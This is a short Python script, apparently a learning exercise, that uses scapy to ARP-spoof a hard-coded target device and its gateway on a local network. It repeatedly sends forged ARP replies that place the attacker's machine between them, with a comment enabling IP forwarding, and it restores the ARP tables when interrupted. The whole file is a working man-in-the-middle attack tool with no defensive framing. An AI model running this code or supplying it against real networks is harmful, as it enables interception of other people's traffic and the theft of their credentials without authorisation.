import time
import scapy.all as scapy
import sys

# echo 1 > /proc/sys/net/ipv4/ip_forward
def get_mac(ip_address):
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_packet = broadcast_packet/arp_request_packet

    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)

    scapy.send(packet, verbose=False)

""""
    First Request
        pdst = PC/Mobile IP
        hwdst = PC/Mobile Mac
        psrc = Router IP
        packet = scapy.ARP(op=2, pdst='192.168.0.106', hwdst='84:2a:fd:0f:3a:8e', psrc='192.168.0.1')
        scapy.send(packet)
"""

sent_packet_count = 0

target_ip = "192.168.0.106"
gateway_ip = "192.168.0.1"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        
        sent_packet_count += 2
        print("\r[+] Packet Sent: " + str(sent_packet_count), end="")

        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Restoring ARP Table.")

    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
